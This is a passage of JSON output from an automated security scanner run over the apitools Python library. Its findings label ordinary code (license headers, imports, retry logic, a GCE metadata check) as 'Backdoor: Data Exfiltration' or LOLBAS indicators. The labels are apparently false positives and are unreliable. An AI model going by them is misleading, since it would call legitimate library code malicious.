                    "text": "              request: An http_wrapper.Request object.\n              retryable_codes: A list of integer HTTP codes that can\n                  be retried.\n              service: A service inheriting from base_api.BaseApiService.\n              method_config: Method config for the desired API request.\n\n            \"\"\"\n",
                    "rendered": {
                      "text": "              request: An http_wrapper.Request object.\n              retryable_codes: A list of integer HTTP codes that can\n                  be retried.\n              service: A service inheriting from base_api.BaseApiService.\n              method_config: Method config for the desired API request.\n\n            \"\"\"\n",
                      "markdown": "`              request: An http_wrapper.Request object.\n              retryable_codes: A list of integer HTTP codes that can\n                  be retried.\n              service: A service inheriting from base_api.BaseApiService.\n              method_config: Method config for the desired API request.\n\n            \"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/batch.py"
                },
                "region": {
                  "startLine": 25,
                  "startColumn": 6,
                  "endLine": 26,
                  "snippet": {
                    "text": "import email.mime.nonmultipart as mime_nonmultipart\nimport email.parser as email_parser\nimport itertools\nimport time\nimport uuid\n\nimport six\nfrom six.moves import http_client\n",
                    "rendered": {
                      "text": "import email.mime.nonmultipart as mime_nonmultipart\nimport email.parser as email_parser\nimport itertools\nimport time\nimport uuid\n\nimport six\nfrom six.moves import http_client\n",
                      "markdown": "`import email.mime.nonmultipart as mime_nonmultipart\nimport email.parser as email_parser\nimport itertools\nimport time\nimport uuid\n\nimport six\nfrom six.moves import http_client\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/batch.py"
                },
                "region": {
                  "startLine": 444,
                  "startColumn": 30,
                  "endLine": 444,
                  "endColumn": 39,
                  "snippet": {
                    "text": "            msg.set_payload(body)\n            message.attach(msg)\n\n        request = http_wrapper.Request(self.__batch_url, 'POST')\n        request.body = message.as_string()\n        request.headers['content-type'] = (\n            'multipart/mixed; boundary=\"%s\"') % message.get_boundary()\n",
                    "rendered": {
                      "text": "            msg.set_payload(body)\n            message.attach(msg)\n\n        request = http_wrapper.Request(self.__batch_url, 'POST')\n        request.body = message.as_string()\n        request.headers['content-type'] = (\n            'multipart/mixed; boundary=\"%s\"') % message.get_boundary()\n",
                      "markdown": "`            msg.set_payload(body)\n            message.attach(msg)\n\n        request = http_wrapper.Request(self.__batch_url, 'POST')\n        request.body = message.as_string()\n        request.headers['content-type'] = (\n            'multipart/mixed; boundary=\"%s\"') % message.get_boundary()\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/batch.py"
                },
                "region": {
                  "startLine": 339,
                  "startColumn": 38,
                  "endLine": 339,
                  "endColumn": 43,
                  "snippet": {
                    "text": "            request_line,\n            u'HTTP/1.1\\n'\n        ))\n        major, minor = request.headers.get(\n            'content-type', 'application/json').split('/')\n        msg = mime_nonmultipart.MIMENonMultipart(major, minor)\n\n",
                    "rendered": {
                      "text": "            request_line,\n            u'HTTP/1.1\\n'\n        ))\n        major, minor = request.headers.get(\n            'content-type', 'application/json').split('/')\n        msg = mime_nonmultipart.MIMENonMultipart(major, minor)\n\n",
                      "markdown": "`            request_line,\n            u'HTTP/1.1\\n'\n        ))\n        major, minor = request.headers.get(\n            'content-type', 'application/json').split('/')\n        msg = mime_nonmultipart.MIMENonMultipart(major, minor)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/credentials_lib_test.py"
                },
                "region": {
                  "startLine": 6,
                  "startColumn": 38,
                  "endLine": 7,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/http_wrapper_test.py"
                },
                "region": {
                  "startLine": 6,
                  "startColumn": 38,
                  "endLine": 7,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/http_wrapper_test.py"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 20,
                  "endLine": 66,
                  "endColumn": 29,
                  "snippet": {
                    "text": "        http_wrapper.Request(body=RaisesExceptionOnLen())\n\n    def testRequestBodyWithLen(self):\n        http_wrapper.Request(body='burrito')\n\n    @unittest.skipIf(not _TOKEN_REFRESH_STATUS_AVAILABLE,\n                     'oauth2client<1.5 lacks HttpAccessTokenRefreshError.')\n",
                    "rendered": {
                      "text": "        http_wrapper.Request(body=RaisesExceptionOnLen())\n\n    def testRequestBodyWithLen(self):\n        http_wrapper.Request(body='burrito')\n\n    @unittest.skipIf(not _TOKEN_REFRESH_STATUS_AVAILABLE,\n                     'oauth2client<1.5 lacks HttpAccessTokenRefreshError.')\n",
                      "markdown": "`        http_wrapper.Request(body=RaisesExceptionOnLen())\n\n    def testRequestBodyWithLen(self):\n        http_wrapper.Request(body='burrito')\n\n    @unittest.skipIf(not _TOKEN_REFRESH_STATUS_AVAILABLE,\n                     'oauth2client<1.5 lacks HttpAccessTokenRefreshError.')\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/http_wrapper_test.py"
                },
                "region": {
                  "startLine": 63,
                  "startColumn": 20,
                  "endLine": 63,
                  "endColumn": 29,
                  "snippet": {
                    "text": "class HttpWrapperTest(unittest.TestCase):\n\n    def testRequestBodyUsesLengthProperty(self):\n        http_wrapper.Request(body=RaisesExceptionOnLen())\n\n    def testRequestBodyWithLen(self):\n        http_wrapper.Request(body='burrito')\n",
                    "rendered": {
                      "text": "class HttpWrapperTest(unittest.TestCase):\n\n    def testRequestBodyUsesLengthProperty(self):\n        http_wrapper.Request(body=RaisesExceptionOnLen())\n\n    def testRequestBodyWithLen(self):\n        http_wrapper.Request(body='burrito')\n",
                      "markdown": "`class HttpWrapperTest(unittest.TestCase):\n\n    def testRequestBodyUsesLengthProperty(self):\n        http_wrapper.Request(body=RaisesExceptionOnLen())\n\n    def testRequestBodyWithLen(self):\n        http_wrapper.Request(body='burrito')\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/buffered_stream.py"
                },
                "region": {
                  "startLine": 63,
                  "startColumn": 37,
                  "endLine": 63,
                  "endColumn": 41,
                  "snippet": {
                    "text": "        if size is None or size < 0:\n            raise exceptions.NotYetImplementedError(\n                'Illegal read of size %s requested on BufferedStream. '\n                'Wrapped stream %s is at position %s-%s, '\n                '%s bytes remaining.' %\n                (size, self.__stream, self.__start_pos, self.__end_pos,\n                 self._bytes_remaining))\n",
                    "rendered": {
                      "text": "        if size is None or size < 0:\n            raise exceptions.NotYetImplementedError(\n                'Illegal read of size %s requested on BufferedStream. '\n                'Wrapped stream %s is at position %s-%s, '\n                '%s bytes remaining.' %\n                (size, self.__stream, self.__start_pos, self.__end_pos,\n                 self._bytes_remaining))\n",
                      "markdown": "`        if size is None or size < 0:\n            raise exceptions.NotYetImplementedError(\n                'Illegal read of size %s requested on BufferedStream. '\n                'Wrapped stream %s is at position %s-%s, '\n                '%s bytes remaining.' %\n                (size, self.__stream, self.__start_pos, self.__end_pos,\n                 self._bytes_remaining))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/buffered_stream.py"
                },
                "region": {
                  "startLine": 28,
                  "startColumn": 60,
                  "endLine": 28,
                  "endColumn": 64,
                  "snippet": {
                    "text": "# TODO(user): Consider replacing this with a StringIO.\nclass BufferedStream(object):\n\n    \"\"\"Buffers a stream, reading ahead to determine if we're at the end.\"\"\"\n\n    def __init__(self, stream, start, size):\n        self.__stream = stream\n",
                    "rendered": {
                      "text": "# TODO(user): Consider replacing this with a StringIO.\nclass BufferedStream(object):\n\n    \"\"\"Buffers a stream, reading ahead to determine if we're at the end.\"\"\"\n\n    def __init__(self, stream, start, size):\n        self.__stream = stream\n",
                      "markdown": "`# TODO(user): Consider replacing this with a StringIO.\nclass BufferedStream(object):\n\n    \"\"\"Buffers a stream, reading ahead to determine if we're at the end.\"\"\"\n\n    def __init__(self, stream, start, size):\n        self.__stream = stream\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/buffered_stream.py"
                },
                "region": {
                  "startLine": 19,
                  "startColumn": 42,
                  "endLine": 19,
                  "endColumn": 46,
                  "snippet": {
                    "text": "\n\"\"\"Small helper class to provide a small slice of a stream.\n\nThis class reads ahead to detect if we are at the end of the stream.\n\"\"\"\n\nfrom apitools.base.py import exceptions\n",
                    "rendered": {
                      "text": "\n\"\"\"Small helper class to provide a small slice of a stream.\n\nThis class reads ahead to detect if we are at the end of the stream.\n\"\"\"\n\nfrom apitools.base.py import exceptions\n",
                      "markdown": "`\n\"\"\"Small helper class to provide a small slice of a stream.\n\nThis class reads ahead to detect if we are at the end of the stream.\n\"\"\"\n\nfrom apitools.base.py import exceptions\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/buffered_stream.py"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 38,
                  "endLine": 8,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/util.py"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 38,
                  "endLine": 8,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/util.py"
                },
                "region": {
                  "startLine": 153,
                  "startColumn": 36,
                  "endLine": 153,
                  "endColumn": 42,
                  "snippet": {
                    "text": "\n    Args:\n      retry_attempt: Retry attempt counter.\n      max_wait: Upper bound for wait time [seconds].\n\n    Returns:\n      Number of seconds to wait before retrying request.\n",
                    "rendered": {
                      "text": "\n    Args:\n      retry_attempt: Retry attempt counter.\n      max_wait: Upper bound for wait time [seconds].\n\n    Returns:\n      Number of seconds to wait before retrying request.\n",
                      "markdown": "`\n    Args:\n      retry_attempt: Retry attempt counter.\n      max_wait: Upper bound for wait time [seconds].\n\n    Returns:\n      Number of seconds to wait before retrying request.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/util.py"
                },
                "region": {
                  "startLine": 147,
                  "startColumn": 8,
                  "endLine": 147,
                  "endColumn": 14,
                  "snippet": {
                    "text": "def CalculateWaitForRetry(retry_attempt, max_wait=60):\n    \"\"\"Calculates amount of time to wait before a retry attempt.\n\n    Wait time grows exponentially with the number of attempts. A\n    random amount of jitter is added to spread out retry attempts from\n    different clients.\n\n",
                    "rendered": {
                      "text": "def CalculateWaitForRetry(retry_attempt, max_wait=60):\n    \"\"\"Calculates amount of time to wait before a retry attempt.\n\n    Wait time grows exponentially with the number of attempts. A\n    random amount of jitter is added to spread out retry attempts from\n    different clients.\n\n",
                      "markdown": "`def CalculateWaitForRetry(retry_attempt, max_wait=60):\n    \"\"\"Calculates amount of time to wait before a retry attempt.\n\n    Wait time grows exponentially with the number of attempts. A\n    random amount of jitter is added to spread out retry attempts from\n    different clients.\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/util.py"
                },
                "region": {
                  "startLine": 145,
                  "startColumn": 27,
                  "endLine": 145,
                  "endColumn": 33,
                  "snippet": {
                    "text": "\n\ndef CalculateWaitForRetry(retry_attempt, max_wait=60):\n    \"\"\"Calculates amount of time to wait before a retry attempt.\n\n    Wait time grows exponentially with the number of attempts. A\n    random amount of jitter is added to spread out retry attempts from\n",
                    "rendered": {
                      "text": "\n\ndef CalculateWaitForRetry(retry_attempt, max_wait=60):\n    \"\"\"Calculates amount of time to wait before a retry attempt.\n\n    Wait time grows exponentially with the number of attempts. A\n    random amount of jitter is added to spread out retry attempts from\n",
                      "markdown": "`\n\ndef CalculateWaitForRetry(retry_attempt, max_wait=60):\n    \"\"\"Calculates amount of time to wait before a retry attempt.\n\n    Wait time grows exponentially with the number of attempts. A\n    random amount of jitter is added to spread out retry attempts from\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/util.py"
                },
                "region": {
                  "startLine": 77,
                  "startColumn": 21,
                  "endLine": 77,
                  "endColumn": 26,
                  "snippet": {
                    "text": "    except urllib_error.URLError:\n        return False\n    return (o.getcode() == http_client.OK and\n            o.headers.get('metadata-flavor') == 'Google')\n\n\ndef NormalizeScopes(scope_spec):\n",
                    "rendered": {
                      "text": "    except urllib_error.URLError:\n        return False\n    return (o.getcode() == http_client.OK and\n            o.headers.get('metadata-flavor') == 'Google')\n\n\ndef NormalizeScopes(scope_spec):\n",
                      "markdown": "`    except urllib_error.URLError:\n        return False\n    return (o.getcode() == http_client.OK and\n            o.headers.get('metadata-flavor') == 'Google')\n\n\ndef NormalizeScopes(scope_spec):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/util.py"
                },
                "region": {
                  "startLine": 72,
                  "startColumn": 26,
                  "endLine": 72,
                  "endColumn": 35,
                  "snippet": {
                    "text": "        os.environ.get('GCE_METADATA_ROOT', 'metadata.google.internal'))\n    try:\n        o = urllib_request.build_opener(urllib_request.ProxyHandler({})).open(\n            urllib_request.Request(\n                metadata_url, headers={'Metadata-Flavor': 'Google'}))\n    except urllib_error.URLError:\n        return False\n",
                    "rendered": {
                      "text": "        os.environ.get('GCE_METADATA_ROOT', 'metadata.google.internal'))\n    try:\n        o = urllib_request.build_opener(urllib_request.ProxyHandler({})).open(\n            urllib_request.Request(\n                metadata_url, headers={'Metadata-Flavor': 'Google'}))\n    except urllib_error.URLError:\n        return False\n",
                      "markdown": "`        os.environ.get('GCE_METADATA_ROOT', 'metadata.google.internal'))\n    try:\n        o = urllib_request.build_opener(urllib_request.ProxyHandler({})).open(\n            urllib_request.Request(\n                metadata_url, headers={'Metadata-Flavor': 'Google'}))\n    except urllib_error.URLError:\n        return False\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/util.py"
                },
                "region": {
                  "startLine": 69,
                  "startColumn": 18,
                  "endLine": 69,
                  "endColumn": 23,
                  "snippet": {
                    "text": "      True iff we're running on a GCE instance.\n    \"\"\"\n    metadata_url = 'http://{}'.format(\n        os.environ.get('GCE_METADATA_ROOT', 'metadata.google.internal'))\n    try:\n        o = urllib_request.build_opener(urllib_request.ProxyHandler({})).open(\n            urllib_request.Request(\n",
                    "rendered": {
                      "text": "      True iff we're running on a GCE instance.\n    \"\"\"\n    metadata_url = 'http://{}'.format(\n        os.environ.get('GCE_METADATA_ROOT', 'metadata.google.internal'))\n    try:\n        o = urllib_request.build_opener(urllib_request.ProxyHandler({})).open(\n            urllib_request.Request(\n",
                      "markdown": "`      True iff we're running on a GCE instance.\n    \"\"\"\n    metadata_url = 'http://{}'.format(\n        os.environ.get('GCE_METADATA_ROOT', 'metadata.google.internal'))\n    try:\n        o = urllib_request.build_opener(urllib_request.ProxyHandler({})).open(\n            urllib_request.Request(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/util.py"
                },
                "region": {
                  "startLine": 54,
                  "startColumn": 32,
                  "endLine": 54,
                  "endColumn": 37,
                  "snippet": {
                    "text": "    Returns:\n      True iff we're running on GAE.\n    \"\"\"\n    server_software = os.environ.get('SERVER_SOFTWARE', '')\n    return (server_software.startswith('Development/') or\n            server_software.startswith('Google App Engine/'))\n\n",
                    "rendered": {
                      "text": "    Returns:\n      True iff we're running on GAE.\n    \"\"\"\n    server_software = os.environ.get('SERVER_SOFTWARE', '')\n    return (server_software.startswith('Development/') or\n            server_software.startswith('Google App Engine/'))\n\n",
                      "markdown": "`    Returns:\n      True iff we're running on GAE.\n    \"\"\"\n    server_software = os.environ.get('SERVER_SOFTWARE', '')\n    return (server_software.startswith('Development/') or\n            server_software.startswith('Google App Engine/'))\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/util.py"
                },
                "region": {
                  "startLine": 69,
                  "startColumn": 11,
                  "endLine": 69,
                  "endColumn": 22,
                  "snippet": {
                    "text": "      True iff we're running on a GCE instance.\n    \"\"\"\n    metadata_url = 'http://{}'.format(\n        os.environ.get('GCE_METADATA_ROOT', 'metadata.google.internal'))\n    try:\n        o = urllib_request.build_opener(urllib_request.ProxyHandler({})).open(\n            urllib_request.Request(\n",
                    "rendered": {
                      "text": "      True iff we're running on a GCE instance.\n    \"\"\"\n    metadata_url = 'http://{}'.format(\n        os.environ.get('GCE_METADATA_ROOT', 'metadata.google.internal'))\n    try:\n        o = urllib_request.build_opener(urllib_request.ProxyHandler({})).open(\n            urllib_request.Request(\n",
                      "markdown": "`      True iff we're running on a GCE instance.\n    \"\"\"\n    metadata_url = 'http://{}'.format(\n        os.environ.get('GCE_METADATA_ROOT', 'metadata.google.internal'))\n    try:\n        o = urllib_request.build_opener(urllib_request.ProxyHandler({})).open(\n            urllib_request.Request(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/util.py"
                },
                "region": {
                  "startLine": 54,
                  "startColumn": 25,
                  "endLine": 54,
                  "endColumn": 36,
                  "snippet": {
                    "text": "    Returns:\n      True iff we're running on GAE.\n    \"\"\"\n    server_software = os.environ.get('SERVER_SOFTWARE', '')\n    return (server_software.startswith('Development/') or\n            server_software.startswith('Google App Engine/'))\n\n",
                    "rendered": {
                      "text": "    Returns:\n      True iff we're running on GAE.\n    \"\"\"\n    server_software = os.environ.get('SERVER_SOFTWARE', '')\n    return (server_software.startswith('Development/') or\n            server_software.startswith('Google App Engine/'))\n\n",
                      "markdown": "`    Returns:\n      True iff we're running on GAE.\n    \"\"\"\n    server_software = os.environ.get('SERVER_SOFTWARE', '')\n    return (server_software.startswith('Development/') or\n            server_software.startswith('Google App Engine/'))\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/compression.py"
                },
                "region": {
                  "startLine": 124,
                  "startColumn": 15,
                  "endLine": 124,
                  "endColumn": 19,
                  "snippet": {
                    "text": "            self.__size += len(data)\n\n    def read(self, size=None):\n        \"\"\"Read at most size bytes from this buffer.\n\n        Bytes read from this buffer are consumed and are permanently removed.\n\n",
                    "rendered": {
                      "text": "            self.__size += len(data)\n\n    def read(self, size=None):\n        \"\"\"Read at most size bytes from this buffer.\n\n        Bytes read from this buffer are consumed and are permanently removed.\n\n",
                      "markdown": "`            self.__size += len(data)\n\n    def read(self, size=None):\n        \"\"\"Read at most size bytes from this buffer.\n\n        Bytes read from this buffer are consumed and are permanently removed.\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/compression.py"
                },
                "region": {
                  "startLine": 75,
                  "startColumn": 34,
                  "endLine": 75,
                  "endColumn": 38,
                  "snippet": {
